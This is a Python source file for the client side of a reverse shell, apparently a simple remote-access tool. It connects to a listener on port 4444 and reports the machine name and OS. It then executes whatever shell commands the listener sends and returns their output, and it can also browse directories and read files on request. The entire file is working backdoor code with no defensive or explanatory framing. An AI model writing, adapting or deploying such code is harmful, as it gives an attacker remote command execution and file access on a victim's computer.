import socket, os, subprocess, pathlib, platform

received = b''
currentPath = os.getcwd()

def connect():
	notConnected = True
	while notConnected:
		os.system('cls')
		global host
		global port
		global s

		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

		port = 4444
		host = 'localhost'

		try:
			print('[!] Trying To Connect To %s:%s'%(host, port))
			s.connect((host,port))
			print('[*] Connection Established')
			s.send((str(os.environ['COMPUTERNAME']) + ',' + platform.system()).encode('utf8'))
			notConnected = False
		except Exception as e:
			print('Could Not Connect: ', e)

def checkCom(command):
	global received
	if received[0:len(command) + 1].lower() == (command + " ").lower():
		received = received[len(command) + 1:]
		return True
	elif received[0:len(command)].lower() == command.lower() and len(received) == len(command):
		received = ''
		return True
	else:
		return False

def receive():
	global received
	global currentPath
	#print(type(received) == type(b''))
	received = s.recv(1024).decode('utf8')
	
	if checkCom('quit'):
		s.close()
	elif checkCom('shell'):
		proc2 = subprocess.Popen(received, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		stdout_value = proc2.stdout.read() + proc2.stderr.read()
		args = stdout_value

	elif checkCom('cwd'):
		args = currentPath

	elif checkCom('ls'):
		currentPath = os.getcwd()
		currentDirectory = pathlib.Path(currentPath)
		files = []
		files.append('<DIR> .')
		files.append('<DIR> ..')
		for file in currentDirectory.iterdir():
			if os.path.isdir(file):
				files.append('<DIR> ' + str(file)[len(currentPath) + 1:])
			else:
				files.append('      ' + str(file)[len(currentPath) + 1:])
		args = 'Current Directory: ' + currentPath + '\n' + '\n'.join(files)

	elif checkCom('cd'):
		if os.path.isdir(received):
			os.chdir(received)
			currentPath = os.getcwd()
			args = 'Changed Current Directory to: ' + currentPath
		elif received == '~':
			os.chdir(os.path.expanduser('~'))
			currentPath = os.getcwd()
			args = 'Changed Current Directory to: ' + currentPath
		else:
			args = '"' + received + '" Is not a Directory'

	elif checkCom('cat'):
		f = open(received)
		args = f.read()
		f.close()

	else:
		args = 'Command: "' + received + '" Is Not Recognised'

	send(args)

def send(args):
	global received
	if type(args) == type(''):
		send = s.send(args.encode('utf8'))
	elif type(args) == type(b''):
		send = s.send(args)
	else:
		send = s.send(str(args).encode('utf8'))
	received = b''
	receive()

connect()
receive()
s.close()